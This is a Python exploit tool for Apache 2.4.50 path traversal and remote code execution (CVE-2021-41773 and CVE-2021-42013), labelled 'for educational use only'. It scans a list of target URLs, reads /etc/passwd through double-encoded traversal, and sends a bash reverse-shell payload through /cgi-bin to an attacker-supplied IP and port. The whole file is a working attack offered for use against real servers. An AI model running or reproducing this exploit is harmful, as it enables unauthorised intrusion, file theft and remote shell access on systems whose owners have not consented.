import os
import time
import urllib
import requests
import argparse

from urllib.request import urlopen
from termcolor import colored

def exploit(url, ip, port):
    """Running exploit"""

    already_vulnerable = 0
    original_url = url

    if APACHE_VERSION == '2.4.50':
        # Testing PAYLOAD 1 Apache 2.4.50 without CGI - NO RCE POSSIBLE
        print(colored("[+] Test for CGI disabled..", 'green'))
        payload = "/.%%32%65"
        for x in range(10):
            temp_url = url
            payload1 = "/cgi-bin" + (payload * (x + 1)) + "/etc/passwd"
            temp_url += payload1

            try:
                response = urlopen(temp_url)
                data = response.read()  # Binary response
                print(data.decode())  # We decode it and print command results
                print(colored("[VULNERABLE] payload: " + payload1, 'yellow'))
                print(colored("ANYWAY RCE IS NOT POSSIBLE :-(", 'red'))
                print('\n')
                already_vulnerable = 1
                break

            except Exception:
                pass

        if already_vulnerable != 1:
            # Testing PAYLOAD 2 Apache 2.4.50 with CGI enabled - RCE POSSIBLE
            print(colored("[+] Test for CGI enabled..", 'green'))
            headers = {
                'Content-Type': 'text/plain',
            }
            # Inject reverse shell payload
            post_data = f'echo Content-Type: text/plain; echo; /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'
            payload = "/.%%32%65"
            for x in range(10):
                temp_url = original_url
                payload2 = "/cgi-bin" + (payload * (x + 1)) + "/bin/bash"
                temp_url += payload2

                try:
                    request = urllib.request.Request(temp_url, headers=headers, data=bytes(post_data.encode()))
                    response = urllib.request.urlopen(request)

                    if response.getcode() != 404 or response.getcode() != 400:
                        print(response.read().decode("utf-8"))
                        print(colored("[VULNERABLE] payload: " + payload2, 'yellow'))
                        print(colored(f"[!] RCE IS POSSIBLE :-)", 'yellow'))
                        print(colored(f"[!] Reverse shell triggered, check your listener on {ip}:{port}", 'yellow'))
                        print('\n')
                        break

                except Exception:
                    pass

def checkheaders(url):
    """Check headers for Apache 2.4.50 version"""

    global APACHE_VERSION

    try:
        response = requests.head(url, timeout=5)

        if 'Apache/2.4.50' in response.headers["Server"]:
            APACHE_VERSION = '2.4.50'
            print(colored("[+] " + response.headers["Server"] + " detected on " + url + " - target could be vulnerable", 'green'))
            time.sleep(2)
            return url

        else:
            print(colored("[!] " + response.headers["Server"] + " detected on " + url + " - target NOT vulnerable", 'magenta'))
            print('\n')
            time.sleep(2)
            return 0

    except Exception:
        pass


def main():
    """Main function of tool"""

    
    banner = YELLOW = "\033[93m" f"""

ZZZZZZZZZZZZZZZZZZZ                                           
Z:::::::::::::::::Z                                           
Z:::::::::::::::::Z                                           
Z:::ZZZZZZZZ:::::Z                                            
ZZZZZ     Z:::::Zyyyyyyy           yyyyyyyxxxxxxx      xxxxxxx
        Z:::::Z   y:::::y         y:::::y  x:::::x    x:::::x 
       Z:::::Z     y:::::y       y:::::y    x:::::x  x:::::x  
      Z:::::Z       y:::::y     y:::::y      x:::::xx:::::x   
     Z:::::Z         y:::::y   y:::::y        x::::::::::x    
    Z:::::Z           y:::::y y:::::y          x::::::::x     
   Z:::::Z             y:::::y:::::y           x::::::::x     
ZZZ:::::Z     ZZZZZ     y:::::::::y           x::::::::::x    
Z::::::ZZZZZZZZ:::Z      y:::::::y           x:::::xx:::::x   
Z:::::::::::::::::Z       y:::::y           x:::::x  x:::::x  
Z:::::::::::::::::Z      y:::::y           x:::::x    x:::::x 
ZZZZZZZZZZZZZZZZZZZ     y:::::y           xxxxxxx      xxxxxxx
                       y:::::y                                
                      y:::::y                                 
                     y:::::y                                  
                    y:::::y                                   
                   yyyyyyy                                   
                    
CVE:2021-42013 2021-41773 | for educational use only | https://github.com/Zyx2440
                      
                        """


    print(banner)

    time.sleep(3)
    parser = argparse.ArgumentParser(usage='python3 main.py FILE')
    parser.add_argument('urls', type=str, metavar='urls', help="You need to specify a target file")
    parser.add_argument('-ip', type=str, required=True, help="IP address for the reverse shell")
    parser.add_argument('-port', type=int, required=True, help="Port number for the reverse shell")
    args = parser.parse_args()

    urls_file = args.urls
    ip = args.ip
    port = args.port

    with open(urls_file, "r") as file:
        for url in file:
            vulnerable_url = checkheaders(url.strip('\n'))  # checkheaders returns url
            if vulnerable_url:
                exploit(vulnerable_url, ip, port)

if __name__ == "__main__":
    os.system('clear')
    main()
